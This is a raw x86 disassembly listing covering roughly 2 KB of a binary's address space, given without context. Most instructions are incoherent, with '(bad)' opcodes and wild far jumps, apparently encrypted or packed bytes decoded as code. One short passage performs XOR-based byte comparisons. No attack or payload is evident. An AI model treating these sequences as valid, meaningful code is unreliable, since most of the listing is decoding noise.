  414358:	pop    es
  414359:	repz out dx,al
  41435b:	outs   dx,DWORD PTR ds:[esi]
  41435c:	in     eax,0x1b
  41435e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41435f:	scas   al,BYTE PTR es:[edi]
  414360:	adc    DWORD PTR [eax+0x4cb70228],ebx
  414366:	pushf  
  414367:	jne    0x4143b8
  414369:	jae    0x414375
  41436b:	pop    esp
  41436c:	mov    ebp,0xa94b7948
  414371:	or     edx,esi
  414373:	je     0x414349
  414375:	not    DWORD PTR [eax+0x38]
  414378:	call   0x15e:0x4931b0c7
  41437f:	fs add eax,0x7993cc3e
  414385:	lods   eax,DWORD PTR ds:[esi]
  414386:	fwait
  414387:	dec    ebp
  414388:	push   eax
  414389:	stc    
  41438a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41438b:	gs das 
  41438d:	fild   DWORD PTR [eax+0x1d]
  414390:	ret    
  414391:	loop   0x41438f
  414393:	mov    ecx,0xf12c8ba7
  414398:	icebp  
  414399:	push   edi
  41439a:	mov    dh,0xa5
  41439c:	test   al,0x31
  41439e:	cmp    ebx,esi
  4143a0:	retf   0xde28
  4143a3:	xchg   BYTE PTR [ecx-0x6e2266a0],cl
  4143a9:	or     ecx,ecx
  4143ab:	inc    edi
  4143ac:	in     eax,dx
  4143ad:	jl     0x4143bc
  4143af:	cdq    
  4143b0:	fidiv  WORD PTR [esp+ecx*4]
  4143b3:	jo     0x414342
  4143b5:	and    dh,BYTE PTR [edi]
  4143b7:	outs   dx,DWORD PTR ds:[esi]
  4143b8:	loope  0x414413
  4143ba:	mov    bh,0xda
  4143bc:	inc    eax
  4143bd:	sbb    al,0x94
  4143bf:	pop    es
  4143c0:	xor    ebp,DWORD PTR [ebx-0x65]
  4143c3:	add    ecx,DWORD PTR [ebx]
  4143c5:	inc    edi
  4143c6:	lahf   
  4143c7:	jb     0x4143d3
  4143c9:	mov    esp,0x4791099a
  4143ce:	bound  esp,QWORD PTR [ecx]
  4143d0:	add    DWORD PTR [ebx+0x1fe1e525],eax
  4143d6:	int    0xda
  4143d8:	inc    ebx
  4143d9:	inc    eax
  4143da:	rcl    DWORD PTR [ebx+edi*1+0x7e2c8066],cl
  4143e1:	retf   
  4143e2:	sub    eax,0x1d1a85a
  4143e7:	xchg   edi,eax
  4143e8:	mov    al,ds:0xc6d14689
  4143ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143ee:	or     esp,ebp
  4143f0:	sub    al,0x3b
  4143f2:	ret    0xa05
  4143f5:	lea    ebx,[ecx]
  4143f7:	cmp    edx,DWORD PTR [eax]
  4143f9:	cmp    DWORD PTR [edi+0x43],0x43
  4143fd:	adc    ebx,DWORD PTR [ecx+0x61a316d3]
  414403:	imul   ecx,DWORD PTR [ebx+ebp*2-0x7dfbfb07],0x85db8943
  41440e:	iret   
  41440f:	cmp    al,0x5d
  414411:	mov    ah,0x47
  414413:	js     0x414484
  414415:	mov    dl,0x53
  414417:	xchg   ebp,eax
  414418:	call   0xf4106935
  41441d:	bound  eax,QWORD PTR [esi]
  41441f:	in     al,dx
  414420:	repz and esi,DWORD PTR [ebx-0x632f0ab6]
  414427:	loopne 0x41445f
  414429:	test   eax,0x371acdfd
  41442e:	sbb    al,0xd7
  414430:	pop    ecx
  414431:	(bad)  
  414432:	fidivr DWORD PTR [edi]
  414434:	sbb    esp,esp
  414436:	jne    0x4144b3
  414438:	sub    eax,0xb939e28d
  41443d:	fsub   DWORD PTR [ecx+eax*4+0x4c408740]
  414444:	or     cl,dh
  414446:	sar    DWORD PTR [ecx-0x34],cl
  414449:	dec    eax
  41444a:	jge    0x414400
  41444c:	call   0xe7552348
  414451:	sbb    bh,ch
  414453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414454:	fcomp  QWORD PTR [esi+ebx*1]
  414457:	lds    esi,FWORD PTR ds:0x30fec5cc
  41445d:	jnp    0x41440d
  41445f:	cmp    DWORD PTR [edi-0x4e],edi
  414462:	jnp    0x41447b
  414464:	daa    
  414465:	das    
  414466:	cmp    bh,BYTE PTR [ecx]
  414468:	dec    eax
  414469:	and    dl,bh
  41446b:	dec    esp
  41446c:	fnstsw WORD PTR [edx+0x17d21436]
  414472:	mul    esi
  414474:	outs   dx,BYTE PTR ds:[esi]
  414475:	jecxz  0x414451
  414477:	push   ss
  414478:	mov    ebx,DWORD PTR [edi+0xe]
  41447b:	stc    
  41447c:	jo     0x414422
  41447e:	inc    edi
  41447f:	mov    DWORD PTR [ecx+0x10876615],esp
  414485:	xor    al,0x35
  414487:	sbb    BYTE PTR [edx-0x18],ch
  41448a:	mov    BYTE PTR [ecx-0x627dff9f],0xc3
  414491:	adc    ebx,ebp
  414493:	push   0x41322cc8
  414498:	sub    ch,BYTE PTR [ebx+0x69e9d36c]
  41449e:	fnstenv [esi+ecx*2+0x57da9c01]
  4144a5:	pop    ecx
  4144a6:	scas   eax,DWORD PTR es:[edi]
  4144a7:	jmp    0xc92:0xe6c1ae2b
  4144ae:	rcr    DWORD PTR [edx],cl
  4144b0:	cmp    bh,BYTE PTR [esp+eiz*8]
  4144b3:	sub    ch,BYTE PTR ds:0xb437c3c0
  4144b9:	xchg   edx,eax
  4144ba:	scas   eax,DWORD PTR es:[edi]
  4144bb:	sbb    ecx,DWORD PTR [edx]
  4144bd:	mov    WORD PTR [esi-0x9],?
  4144c0:	sub    ah,dh
  4144c2:	xor    ecx,eax
  4144c4:	jl     0x4144bb
  4144c6:	mov    edi,0x9b850f86
  4144cb:	and    BYTE PTR [edi],dh
  4144cd:	cmp    al,dh
  4144cf:	je     0x414535
  4144d1:	push   0xfd967165
  4144d6:	jecxz  0x41445d
  4144d8:	ins    BYTE PTR es:[edi],dx
  4144d9:	jbe    0x4144aa
  4144db:	aas    
  4144dc:	cli    
  4144dd:	js     0x414483
  4144df:	dec    ebx
  4144e0:	cmp    DWORD PTR [ebx+0x55],ebp
  4144e3:	mov    fs,WORD PTR [edx+0x1059936e]
  4144e9:	ds push 0x45be16b4
  4144ef:	mov    dl,dh
  4144f1:	cld    
  4144f2:	fcomp  DWORD PTR [ebx+0x32]
  4144f5:	das    
  4144f6:	mov    eax,ds:0xc717ee5f
  4144fb:	cmp    DWORD PTR [ecx-0x3418b8e],eax
  414501:	rol    BYTE PTR [edx],1
  414503:	sbb    eax,0x3a134547
  414508:	jl     0x41453e
  41450a:	adc    DWORD PTR [esi],ecx
  41450c:	inc    eax
  41450d:	sub    ebx,esi
  41450f:	dec    esp
  414510:	pop    ecx
  414511:	fild   QWORD PTR [ebp+0x25]
  414514:	lock mov ebp,0xafaa5844
  41451a:	imul   esi,DWORD PTR [edi],0x59
  41451d:	test   dl,al
  41451f:	dec    ecx
  414520:	jae    0x414515
  414522:	push   ecx
  414523:	and    eax,0xc5c5905b
  414528:	retf   
  414529:	jle    0x414562
  41452b:	jle    0x414547
  41452d:	lods   al,BYTE PTR ds:[esi]
  41452e:	pop    ecx
  41452f:	push   esi
  414530:	mov    esp,0xa9d76521
  414535:	jne    0x41451d
  414537:	pop    esi
  414538:	in     eax,dx
  414539:	mov    eax,ds:0x5f81d4e4
  41453e:	xor    al,0xe
  414540:	fs clc 
  414542:	aaa    
  414543:	pop    ss
  414544:	push   ebx
  414545:	xchg   ecx,eax
  414546:	ins    DWORD PTR es:[edi],dx
  414547:	push   ebx
  414548:	and    al,BYTE PTR [ecx-0xb]
  41454b:	shl    DWORD PTR [ebx],0x47
  41454e:	fisttp WORD PTR [esi+0x61]
  414551:	jecxz  0x414500
  414553:	idiv   BYTE PTR [ebx-0x4e996473]
  414559:	dec    ebx
  41455a:	xor    cl,dh
  41455c:	aam    0x72
  41455e:	xchg   BYTE PTR [edx],ah
  414560:	call   0xa5f7533a
  414565:	into   
  414566:	test   eax,0xf852b4bd
  41456b:	mov    eax,ds:0x6af4da4c
  414570:	rol    ch,0x99
  414573:	lds    edx,FWORD PTR [ebx-0x24]
  414576:	adc    al,0xaa
  414578:	loope  0x4145aa
  41457a:	or     dh,BYTE PTR [ecx]
  41457c:	fisubr DWORD PTR [eax-0x17]
  41457f:	add    BYTE PTR [edx],bh
  414581:	mov    edx,0x936077ec
  414586:	jecxz  0x41458b
  414588:	sub    BYTE PTR [edi],ah
  41458a:	inc    edi
  41458b:	aaa    
  41458c:	mov    ebp,DWORD PTR [edi-0x32926635]
  414592:	xchg   ecx,eax
  414593:	adc    eax,0x5b3290e4
  414598:	lds    edi,FWORD PTR [ebx+0x5770f1e]
  41459e:	push   eax
  41459f:	les    ecx,FWORD PTR [eax+0x56]
  4145a2:	xchg   ebx,eax
  4145a3:	shr    eax,1
  4145a5:	sub    esp,DWORD PTR [edi-0x1f]
  4145a8:	les    esp,FWORD PTR [edx+0x6a]
  4145ab:	in     al,dx
  4145ac:	mov    ds:0x89d09a2f,al
  4145b1:	les    esi,FWORD PTR [ecx+edx*8-0x57]
  4145b5:	in     eax,0x5d
  4145b7:	mov    bh,0xce
  4145b9:	jg     0x414611
  4145bb:	imul   edx,esp,0x6b
  4145be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145bf:	push   cs
  4145c0:	sub    cl,BYTE PTR [ecx-0x7]
  4145c3:	jns    0x41458b
  4145c5:	adc    al,0xcd
  4145c7:	add    al,0xb2
  4145c9:	out    0xda,al
  4145cb:	fimul  DWORD PTR [eax-0x50345f67]
  4145d1:	or     eax,0x2cbaf82a
  4145d6:	scas   al,BYTE PTR es:[edi]
  4145d7:	sti    
  4145d8:	pop    ds
  4145d9:	and    al,0x83
  4145db:	xor    al,0xfe
  4145dd:	add    ecx,DWORD PTR [esi-0x58fce524]
  4145e3:	or     eax,0x83d7a55e
  4145e8:	pop    DWORD PTR [ebp-0x150386c4]
  4145ee:	outs   dx,BYTE PTR ds:[esi]
  4145ef:	or     BYTE PTR [ebx-0x717d4f73],dh
  4145f5:	or     cl,0x66
  4145f8:	icebp  
  4145f9:	inc    esi
  4145fa:	out    dx,al
  4145fb:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145fd:	sub    dh,BYTE PTR [esi+0x3c935a10]
  414603:	mov    ebx,0x26f07df6
  414608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414609:	leave  
  41460a:	dec    edi
  41460b:	mov    edi,es
  41460d:	addr16 popf 
  41460f:	mov    dh,0xb8
  414611:	ret    
  414612:	xor    ch,dl
  414614:	stc    
  414615:	sub    eax,0xd6009ee6
  41461a:	xchg   edi,eax
  41461b:	push   0xffffffe4
  41461d:	mov    al,ds:0x5e94d45
  414622:	cmp    dh,bl
  414624:	jge    0x414665
  414626:	mov    bl,0x3b
  414628:	loope  0x4145c3
  41462a:	arpl   WORD PTR [eax],cx
  41462c:	ja     0x4145ba
  41462e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41462f:	adc    eax,0xf1a625d0
  414634:	retf   
  414635:	rol    edi,0x95
  414638:	(bad)  
  414639:	cmp    BYTE PTR [esi-0x3e],dl
  41463c:	sbb    ecx,ebx
  41463e:	mov    al,ds:0x6b9252c9
  414643:	jno    0x41469b
  414645:	pop    es
  414646:	aam    0xba
  414648:	sti    
  414649:	and    dl,bl
  41464b:	ja     0x41465a
  41464d:	xchg   edx,eax
  41464e:	div    esi
  414650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414651:	std    
  414652:	aaa    
  414653:	jle    0x414605
  414655:	adc    BYTE PTR [ecx+0x254d40ea],dh
  41465b:	push   esi
  41465c:	out    0x60,eax
  41465e:	sub    ecx,esp
  414660:	pop    ecx
  414661:	mov    ds,ebp
  414663:	stos   DWORD PTR es:[edi],eax
  414664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414665:	mov    DWORD PTR [ecx+0x75],ebp
  414668:	push   esp
  414669:	out    0x18,eax
  41466b:	or     edx,DWORD PTR [eax*2+0x61fd773]
  414672:	cmp    al,0x57
  414674:	inc    ecx
  414675:	gs ins BYTE PTR es:[edi],dx
  414677:	packssdw mm5,QWORD PTR [edi+0x14]
  41467b:	or     BYTE PTR [eax-0x437812e2],bl
  414681:	mov    ebp,0xc73ad08c
  414686:	push   edi
  414687:	jmp    0x8edb9126
  41468c:	div    ebx
  41468e:	arpl   WORD PTR [ecx-0x3c2b287e],cx
  414694:	pusha  
  414695:	or     BYTE PTR [eax+edi*1],ch
  414698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414699:	and    eax,0x5946c964
  41469e:	(bad)  
  41469f:	test   al,0x57
  4146a1:	sbb    BYTE PTR [eax],ch
  4146a3:	jnp    0x4146d9
  4146a5:	aaa    
  4146a6:	mov    bh,0xb8
  4146a8:	out    dx,eax
  4146a9:	jb     0x4146a3
  4146ab:	outs   dx,BYTE PTR ds:[esi]
  4146ac:	and    BYTE PTR [edx-0x77023ef4],bl
  4146b2:	push   0xffffffd0
  4146b4:	fist   WORD PTR [ebp+0x38]
  4146b7:	push   ebp
  4146b8:	and    ebp,DWORD PTR [eax-0x6c3ff97e]
  4146be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146bf:	jb     0x414677
  4146c1:	les    eax,FWORD PTR [ecx]
  4146c3:	cmp    BYTE PTR [edi-0x423640c],bh
  4146c9:	push   ebp
  4146ca:	fwait
  4146cb:	mov    ds:0xb9cc2854,eax
  4146d0:	adc    al,0xc6
  4146d2:	aaa    
  4146d3:	mov    bl,dh
  4146d5:	sub    DWORD PTR [ebp-0x1b],0xffffffad
  4146d9:	retf   
  4146da:	enter  0x5aa9,0x4b
  4146de:	ret    
  4146df:	cmc    
  4146e0:	ja     0x414728
  4146e2:	mov    cl,0x57
  4146e4:	sbb    DWORD PTR [ecx],ebp
  4146e6:	dec    ebx
  4146e7:	push   0xffffffe7
  4146e9:	ret    0x8e7f
  4146ec:	mov    cl,0xa3
  4146ee:	stos   DWORD PTR es:[edi],eax
  4146ef:	or     al,0x6
  4146f1:	adc    DWORD PTR [edi],0xffffffec
  4146f4:	ss pushf 
  4146f6:	and    bl,BYTE PTR [edi-0x6a63eece]
  4146fc:	adc    BYTE PTR [ecx],0x13
  4146ff:	sahf   
  414700:	jl     0x4146bc
  414702:	addr16 (bad) 
  414704:	xchg   ecx,eax
  414705:	sub    BYTE PTR [ecx],0xc8
  414708:	jmp    0x414783
  41470a:	sbb    eax,0x86fe557b
  41470f:	xchg   DWORD PTR ds:0x2ab6c1c3,ebx
  414715:	ret    
  414716:	mov    al,ds:0x83d64019
  41471b:	dec    DWORD PTR [ecx-0x1e54bb5c]
  414721:	ror    DWORD PTR [edi],0xe6
  414724:	xchg   ebx,eax
  414725:	sbb    bl,BYTE PTR [ebp+0x43edc479]
  41472b:	cld    
  41472c:	iret   
  41472d:	fs adc eax,0xc67b664
  414733:	lea    esi,[ebp-0x7deecf5e]
  414739:	loopne 0x41476c
  41473b:	xor    DWORD PTR [esi-0x5a57b252],esp
  414741:	push   edi
  414742:	shl    DWORD PTR [ebx],cl
  414744:	xchg   edi,eax
  414745:	cld    
  414746:	lock aaa 
  414748:	fwait
  414749:	jge    0x41477b
  41474b:	add    DWORD PTR [ebp-0x6e],0x62
  41474f:	aas    
  414750:	push   eax
  414751:	adc    BYTE PTR [ecx+eiz*1],0xe4
  414755:	xchg   edi,eax
  414756:	iret   
  414757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414758:	nop
  414759:	jecxz  0x41476b
  41475b:	test   eax,0x38b127d8
  414760:	pop    eax
  414761:	out    dx,eax
  414762:	or     dl,BYTE PTR [edi-0x42]
  414765:	lea    edi,[eax]
  414767:	add    BYTE PTR [edi+0x48],dl
  41476a:	ja     0x41472c
  41476c:	mov    WORD PTR [edx+esi*2-0x1566c266],cs
  414773:	sub    eax,0xbca4e7aa
  414778:	scas   al,BYTE PTR es:[edi]
  414779:	loopne 0x414702
  41477b:	push   edi
  41477c:	not    DWORD PTR [eax+0x5e]
  41477f:	push   ebp
  414780:	sub    ch,BYTE PTR ds:0xb6648e0
  414786:	or     eax,DWORD PTR [edx-0x6bc9502]
  41478c:	pop    es
  41478d:	xor    BYTE PTR [edx+ebp*4-0x58610f58],ah
  414794:	loopne 0x414803
  414796:	cmp    BYTE PTR [edi+edi*2+0x27],dh
  41479a:	pop    eax
  41479b:	retf   0x92e6
  41479e:	retf   0x88b4
  4147a1:	xor    DWORD PTR [ebp+0x5c],edi
  4147a4:	mov    bh,BYTE PTR [eax]
  4147a6:	div    esp
  4147a8:	and    eax,0x87b02d81
  4147ad:	imul   esp,DWORD PTR [edi-0x4a29c7dd],0x36
  4147b4:	fdiv   DWORD PTR [eax+0x39ca752f]
  4147ba:	add    eax,0x4c56f841
  4147bf:	xor    al,0xe2
  4147c1:	loop   0x4147e4
  4147c3:	(bad)  
  4147c5:	(bad)  
  4147c6:	and    edx,DWORD PTR [edx]
  4147c8:	retf   
  4147c9:	in     al,0xb4
  4147cb:	not    bl
  4147cd:	mov    DWORD PTR [edi+0x2ef64257],ebx
  4147d3:	mov    bl,BYTE PTR [ebp-0x40]
  4147d6:	jnp    0x4147dc
  4147d8:	add    DWORD PTR [ebx+eiz*4+0x12cf2463],0xb673367
  4147e3:	sub    dh,BYTE PTR [eax+0x35ab7903]
  4147e9:	or     BYTE PTR [ebx-0x26eadc45],ch
  4147ef:	and    ecx,edx
  4147f1:	bnd jb 0x414780
  4147f4:	in     al,0x43
  4147f6:	and    ch,ah
  4147f8:	pop    edi
  4147f9:	adc    ebx,0x92f4f6aa
  4147ff:	aas    
  414800:	js     0x41484f
  414802:	test   eax,0x78fc3f25
  414807:	call   0xc7f691d6
  41480c:	dec    edi
  41480d:	(bad)  
  41480f:	push   ds
  414810:	inc    DWORD PTR ds:0x29584f1a
  414816:	in     eax,0xfa
  414818:	div    BYTE PTR [edi]
  41481a:	adc    eax,0x5e7503e9
  41481f:	ins    BYTE PTR es:[edi],dx
  414820:	stos   BYTE PTR es:[edi],al
  414821:	shr    DWORD PTR fs:[ebx+edx*2-0x4c],cl
  414826:	push   esi
  414827:	jle    0x4147b8
  414829:	sub    ch,BYTE PTR [esp+esi*8+0x27]
  41482d:	inc    ebx
  41482e:	cs stos DWORD PTR es:[edi],eax
  414830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414831:	ins    BYTE PTR es:[edi],dx
  414832:	sbb    al,0x71
  414834:	inc    edx
  414835:	push   esp
  414836:	fs sub si,ax
  41483a:	nop
  41483b:	push   eax
  41483c:	inc    ecx
  41483d:	jbe    0x414845
  41483f:	retf   0xe623
  414842:	ret    0x7245
  414845:	cdq    
  414846:	inc    esp
  414847:	inc    edi
  414848:	aaa    
  414849:	inc    BYTE PTR [esi+0x43]
  41484c:	lods   al,BYTE PTR ds:[esi]
  41484d:	mov    ebx,0xa0721856
  414852:	sbb    eax,0xe95234b6
  414857:	into   
  414858:	or     BYTE PTR [esi+0x5b],bh
  41485b:	push   cs
  41485c:	cmp    al,0x3e
  41485e:	mov    WORD PTR [edx+0x2f2e6046],es
  414864:	inc    ebp
  414865:	or     eax,eax
  414867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414868:	mov    ah,0x18
  41486a:	mov    eax,DWORD PTR [ebx+0x17]
  41486d:	clc    
  41486e:	(bad)  
  41486f:	aam    0xa0
  414871:	aaa    
  414872:	and    bl,BYTE PTR [edx]
  414874:	jl     0x41484f
  414876:	xchg   ebx,eax
  414877:	inc    esp
  414878:	(bad)  
  414879:	test   ah,0xe9
  41487c:	push   es
  41487d:	cmp    DWORD PTR [esi],ebx
  41487f:	adc    ah,bl
  414881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414882:	cmp    edx,0x2c4eeb58
  414888:	push   esi
  414889:	sub    esp,DWORD PTR [ecx]
  41488b:	mov    DWORD PTR ds:0xec7247b7,edi
  414891:	jge    0x4148e8
  414893:	mov    eax,ds:0xd8cbc975
  414898:	adc    ebp,ebp
  41489a:	mov    bl,BYTE PTR ds:0xd905c604
  4148a0:	pop    esi
  4148a1:	mov    esp,0xcf7e21a1
  4148a6:	clc    
  4148a7:	scas   eax,DWORD PTR es:[edi]
  4148a8:	and    al,0xfa
  4148aa:	jne    0x4148bc
  4148ac:	js     0x414922
  4148ae:	loope  0x414863
  4148b0:	lds    ecx,FWORD PTR ds:0xa0931a
  4148b6:	int    0x25
  4148b8:	adc    eax,0x48c3f432
  4148bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148be:	stos   BYTE PTR es:[edi],al
  4148bf:	ja     0x41493d
  4148c1:	jbe    0x414880
  4148c3:	jne    0x41492b
  4148c5:	ss (bad) 
  4148c7:	dec    ebx
  4148c8:	xchg   DWORD PTR [eax],esp
  4148ca:	pushw  es
  4148cc:	add    al,0x9c
  4148ce:	fcomp  DWORD PTR [edi+0x7984fac2]
  4148d4:	push   ebp
  4148d5:	and    cl,BYTE PTR [ecx+0x52]
  4148d8:	jae    0x414946
  4148da:	stos   DWORD PTR es:[edi],eax
  4148db:	or     DWORD PTR [esi],ebp
  4148dd:	ins    DWORD PTR es:[edi],dx
  4148de:	push   ds
  4148df:	aas    
  4148e0:	adc    al,0x3b
  4148e2:	lock popf 
  4148e4:	ret    
  4148e5:	jle    0x414906
  4148e7:	cwde   
  4148e8:	jmp    0x1083:0x82728895
  4148ef:	hlt    
  4148f0:	cmp    eax,0xeeb494fc
  4148f5:	lea    esi,[ebx]
  4148f7:	mov    WORD PTR [edi+0x24557be4],dx
  4148fe:	mov    al,ds:0x11d1f3ba
  414903:	pop    ebp
  414904:	mov    eax,DWORD PTR [eax+0x76fb38ed]
  41490a:	sub    eax,0x1760893c
  41490f:	stos   DWORD PTR es:[edi],eax
  414910:	mov    edx,DWORD PTR [ebp-0xc]
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    ah,bl
  414990:	neg    DWORD PTR [ecx]
  414992:	fisttp DWORD PTR [esi-0x6c]
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	mov    dl,0xf5
  41499d:	mov    edi,0x905ea6b6
  4149a2:	inc    edx
  4149a3:	adc    BYTE PTR [edi],ch
  4149a5:	int3   
  4149a6:	test   al,0xf2
  4149a8:	and    eax,ebx
  4149aa:	mov    edi,0x762a846c
  4149af:	das    
  4149b0:	out    0x42,eax
  4149b2:	test   DWORD PTR [ebx-0x2c473bc8],esi
  4149b8:	(bad)  
  4149b9:	and    al,0x1b
  4149bb:	shr    esi,0x3a
  4149be:	mov    dl,0x76
  4149c0:	add    BYTE PTR [ecx+0x3b],0xd0
  4149c4:	bound  eax,QWORD PTR [eax+0x2e]
  4149c7:	and    edi,DWORD PTR [edi-0x226a831]
  4149cd:	xchg   DWORD PTR [ecx],ebx
  4149cf:	je     0x4149e8
  4149d1:	in     eax,dx
  4149d2:	add    al,BYTE PTR [edx-0x74]
  4149d5:	out    dx,eax
  4149d6:	xor    DWORD PTR [edx],edx
  4149d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149d9:	jns    0x4149d0
  4149db:	leave  
  4149dc:	test   BYTE PTR [eax+0x27],bh
  4149df:	or     ah,BYTE PTR [ecx-0x4e]
  4149e2:	pop    ebx
  4149e3:	inc    edx
  4149e4:	stos   DWORD PTR es:[edi],eax
  4149e5:	cs or  dh,al
  4149e8:	aam    0x18
  4149ea:	mov    ds:0x62b66936,eax
  4149ef:	cdq    
  4149f0:	ins    BYTE PTR es:[edi],dx
  4149f1:	hlt    
  4149f2:	mov    al,0x17
  4149f4:	idiv   BYTE PTR [ebx-0x48]
  4149f7:	into   
  4149f8:	cdq    
  4149f9:	jnp    0x414a27
  4149fb:	xchg   ebp,eax
  4149fc:	push   es
  4149fd:	add    eax,0xf6aac1b7
  414a02:	or     DWORD PTR [edx],edx
  414a04:	adc    BYTE PTR [ebp+0x4ba78263],ah
  414a0a:	xor    BYTE PTR [esi+0x48],cl
  414a0d:	call   0xd228ed93
  414a12:	cdq    
  414a13:	outs   dx,BYTE PTR ds:[esi]
  414a14:	xor    BYTE PTR [esi],bh
  414a16:	lahf   
  414a17:	lea    edi,[eax]
  414a19:	sbb    DWORD PTR ds:0xbc241701,eax
  414a1f:	fisub  WORD PTR [edx]
  414a21:	mov    bl,0x5d
  414a23:	gs push cs
  414a25:	jg     0x414a08
  414a27:	call   0x10b9:0x3ef442e7
  414a2e:	in     al,0x64
  414a30:	and    eax,0x4a203467
  414a36:	jbe    0x414a45
  414a38:	mov    esi,DWORD PTR [eax]
  414a3a:	loope  0x414a02
  414a3c:	loop   0x414a1f
  414a3e:	xchg   ebp,eax
  414a3f:	(bad)  
  414a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a41:	pusha  
  414a42:	test   DWORD PTR [edi-0x9],eax
  414a45:	jo     0x414a8b
  414a47:	shl    BYTE PTR [ebx-0x3c],0x1e
  414a4b:	adc    cl,BYTE PTR [eax-0x7c93f709]
  414a51:	add    BYTE PTR [ebp-0x78],ch
  414a54:	sbb    ecx,edi
  414a56:	jp     0x4149e2
  414a58:	adc    al,0xeb
  414a5a:	mov    WORD PTR [ebp+0x7f94a1b],gs
  414a60:	inc    ebp
  414a61:	mov    dh,0xe0
  414a63:	cmp    esi,ecx
  414a65:	test   DWORD PTR [ebp+0x76],0x779dbe17
  414a6c:	mov    dh,0xbe
  414a6e:	popa   
  414a6f:	xlat   BYTE PTR ds:[ebx]
  414a70:	mov    ebp,0x7542bae1
  414a75:	out    dx,al
  414a76:	mov    dh,0xda
  414a78:	adc    BYTE PTR ds:0x922c4ff9,ch
  414a7e:	or     al,0xaf
  414a80:	pop    esi
  414a81:	(bad)  
  414a82:	adc    DWORD PTR [ecx+esi*2-0x47],ebx
  414a86:	mov    dh,bh
  414a88:	dec    ebx
  414a89:	call   0x433f:0x77eee2f4
  414a90:	inc    esi
  414a91:	inc    esp
  414a92:	(bad)  
  414a93:	push   ss
  414a94:	mov    ch,0x91
  414a96:	xor    BYTE PTR [edx-0x64],0x8e
  414a9a:	sti    
  414a9b:	rcl    DWORD PTR [ecx-0x7c92a922],1
  414aa1:	retf   
  414aa2:	leave  
  414aa3:	mov    esi,DWORD PTR ds:[eax-0x1ed03907]
  414aaa:	ss (bad) 
  414aac:	mov    WORD PTR [eax-0x43],cs
  414aaf:	fdivp  st(6),st
  414ab1:	and    al,BYTE PTR [esi-0x72]
  414ab4:	jns    0x414b29
  414ab6:	jnp    0x414b18
  414ab8:	(bad)  
  414ab9:	lahf   
  414aba:	test   DWORD PTR [esi+0x43],esp
  414abd:	sub    eax,esi
  414abf:	add    eax,0xc8b074f3
  414ac4:	lea    ecx,[esi-0x1da48264]
  414aca:	les    edx,FWORD PTR [esi-0x4ead2e9a]
  414ad0:	push   ebp
  414ad1:	ss call 0x56fbdba3
  414ad7:	mov    ecx,0x2d3a9f64
  414adc:	shr    bh,0x9f
  414adf:	int3   
  414ae0:	mov    dl,0x6a
  414ae2:	adc    ecx,edx
  414ae4:	popf   
  414ae5:	pop    eax
  414ae6:	mov    eax,ds:0x71b9f2d7
  414aeb:	sub    dl,BYTE PTR [ebx+0x45]
  414aee:	adc    esp,DWORD PTR [ebx+0x4d]
  414af1:	jb     0x414b55
  414af3:	(bad)  
  414af4:	imul   ecx,DWORD PTR [edi],0x58
  414af7:	lds    esp,FWORD PTR [ecx]
  414af9:	jle    0x414ac7
  414afb:	hlt    
  414afc:	mov    al,ds:0x9d93b388
  414b01:	icebp  
  414b02:	inc    ebp
  414b03:	js     0x414b64
  414b05:	repz inc esp
  414b07:	pop    edi
  414b08:	mov    ah,0x7b
  414b0a:	cmp    BYTE PTR [ecx],dl
  414b0c:	xor    DWORD PTR [ebp-0x11],0xbcdce6f8
  414b13:	jno    0x414ad9
  414b15:	jbe    0x414b70
  414b17:	pop    ebx
  414b18:	mov    ds:0xcc177c5c,eax
  414b1e:	pop    ss
  414b1f:	push   0x63809c73
  414b24:	popa   
  414b25:	jmp    0x414b34
  414b27:	bound  edx,QWORD PTR [esp+ebx*2+0x25]
  414b2b:	shl    eax,cl
  414b2d:	inc    edx
